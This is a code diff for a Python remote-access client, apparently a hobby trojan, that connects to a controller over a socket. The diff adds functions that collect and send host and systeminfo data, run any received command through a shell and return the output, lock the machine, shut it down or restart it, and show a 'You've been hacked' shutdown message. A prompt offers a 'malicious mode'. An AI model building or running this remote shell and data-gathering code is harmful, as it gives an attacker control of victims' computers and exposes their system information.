@@ -13,10 +13,13 @@
 
 
 import os
+import platform
 import socket
 import subprocess
+import sys
 import time
 from zipfile import ZipFile
+from pprint import pprint
 
 
 class Client:
@@ -47,7 +50,58 @@ class Client:
             print("KEYS MATCHED - PAIRING SUCCESSFUL")
             self.client.send("MATCH".encode("utf-8"))
 
+    def sendHostInfo(self):
+        """ Extracting host information """
 
+        host = sys.platform
+        self.client.send(host.encode("utf-8"))
+        # Make a Dictionary
+        sys_info = {
+                    "Platform": platform.system(),
+                    "Platform Release": platform.release(),
+                    "Platform Version": platform.version(),
+                    "Platform Architecture": platform.architecture(),
+                    "Machine Type": platform.machine(),
+                    "Platform Node": platform.node(),
+                    "Platform Information": platform.platform(),
+                    "ALL": platform.uname(),
+                    "HostName": socket.gethostname(),
+                    "Host IP_Address": socket.gethostbyname(socket.gethostname()),
+                    "CPU": platform.processor(),
+                    "Python Build": platform.python_build(),
+                    "Python Compiler": platform.python_compiler(),
+                    "Python Version": platform.python_version(),
+                    "Windows Platform": platform.win32_ver()
+                  #  "OS": os.uname() # os.uname() ONLY SUPPORTED ON LINUX
+                   }
+        # https://www.geeksforgeeks.org/platform-module-in-python/#:~:text=Python%20defines%20an%20in%2Dbuilt,program%20is%20being%20currently%20executed.
+        cpu = platform.processor()
+        system = platform.system()
+        machine = platform.machine()
+
+        with open('./logs/info.txt', 'w+') as f:
+            for k, v in sys_info.items():
+                f.write(str(k) + ' >>> ' + str(v) + '\n')
+                print(str(k) + ' >>> ' + str(v) + '\n')
+
+        with open('./logs/info.txt', 'rb+') as f:
+            self.client.send(f.read())
+        print("CPU: " + cpu + '\n', "System: " + system + '\n', "Machine: " + machine + '\n')
+        input()
+        pprint(sys_info)
+        input()
+        self.sysinfViaCMD()
+
+    def sysinfViaCMD(self):
+        # traverse the info
+        Id = subprocess.check_output(['systeminfo']).decode('utf-8').split('\n')
+        new = []
+
+        # arrange the string into clear info
+        for item in Id:
+            new.append(str(item.split("\r")[:-1]))
+        for i in new:
+            print(i[2:-2])
 
     def txtmsg(self):
         print("TextMessageMode: Activated")
@@ -57,31 +111,6 @@ class Client:
         # self.client.send("[+] Message displayed and closed.".encode("utf-8"))
         time.sleep(2)
         self.client.send("[+] Message displayed and closed.".encode("utf-8"))
-
-    def fakeshell(self):
-        """ Shell """
-
-        print("SHELL MODE ENABLED: ")
-        msg = (self.client.recv(self.BUFFER_SIZE).decode("utf-8"))
-        if "cd" in msg.lower():
-            try:
-                d = msg[3:].strip()
-                os.chdir(d)
-                self.client.send("[*] Done".encode("utf-8"))
-            except:
-                self.client.send("[*] Dir not found / something went wrong.".encode("utf-8"))
-        else:
-
-            obj = subprocess.Popen(msg, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
-                                   shell=True)
-            output = (obj.stdout.read() + obj.stderr.read()).decode("utf-8", errors="ignore")
-            print("A")
-            if output == "" or output == "\n":
-                print("B")
-                self.client.send("[*] Done".encode("utf-8"))
-            else:
-                print("C")
-                self.client.send(output.encode("utf-8"))
 
     def filesend(self):
         print("FILE SEND MODE: Enabled")
@@ -110,8 +139,7 @@ class Client:
 
         # os.remove(archname)
 
-    def getshutdown(self):
-        msg = "shutdown /s"
+    def runprocess(self, msg):
         obj = subprocess.Popen(msg, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                                shell=True)
         output = (obj.stdout.read() + obj.stderr.read()).decode("utf-8", errors="ignore")
@@ -122,6 +150,66 @@ class Client:
         else:
             print("C")
             self.client.send(output.encode("utf-8"))
+
+    def runrun(self, msg):
+        obj = "failed"
+        try:
+            obj, _ = subprocess.run(msg, check=True, shell=True)
+            # output = (obj.stdout.read() + obj.stderr.read()).decode("utf-8", errors="ignore")
+        except Exception as e:
+            print("This failed too (runrun) : " + str(e) + " + " + str(obj))
+
+    def enableTN(self):
+        msg = "start /B start cmd.exe @cmd /c pkgmgr /iu:TelnetClient "
+        self.runrun(msg)
+
+    def playchess(self):
+        msg = "start /B start cmd.exe @cmd /c telnet freechess.org "
+        self.runrun(msg)
+        # chess_true = subprocess.check_call("start /B start cmd.exe @cmd /k telnet freechess.org ", shell=True)
+
+    def playstarwars(self):
+        msg = "start /B start cmd.exe @cmd /c telnet towel.blinkenlights.nl "
+        self.runrun(msg)
+        # Sw = subprocess.check_call("start /B start cmd.exe @cmd /c telnet towel.blinkenlights.nl ", shell=True)
+
+    def weather(self):
+        msg = "start /B start cmd.exe @cmd /c telnet rainmaker.wunderground.com "
+        self.runrun(msg)
+        # weather = subprocess.check_call("start /B start cmd.exe @cmd /c telnet rainmaker.wunderground.com ", shell=True)
+
+    def locksystem(self):
+        msg = "rundll32.exe user32.dll, LockWorkStation"
+        self.runrun(msg)
+
+    def shutdown(self):
+        msg = "shutdown /s"
+        self.runrun(msg)
+
+    def shutdownmessage(self):
+        msg = "shutdown /s /e 'You've been hacked '"
+        self.runrun(msg)
+
+    def restart(self):
+        msg = "shutdown /r"
+        self.runrun(msg)
+
+    def fakeshell(self):
+        """ Shell """
+
+        print("SHELL MODE ENABLED: ")
+        msg = (self.client.recv(self.BUFFER_SIZE).decode("utf-8"))
+        if "cd" in msg.lower():
+            try:
+                d = msg[3:].strip()
+                os.chdir(d)
+                self.client.send("[*] Done".encode("utf-8"))
+            except:
+                self.client.send("[*] Dir not found / something went wrong.".encode("utf-8"))
+        else:
+            # subprocess.checkoutput
+            self.runprocess(msg)
+            # self.runrun(msg)
 
     def endless(self):
         malorgood = input("Enter 1 to run in malicious mode or 2 to run in virtuous mode: ")
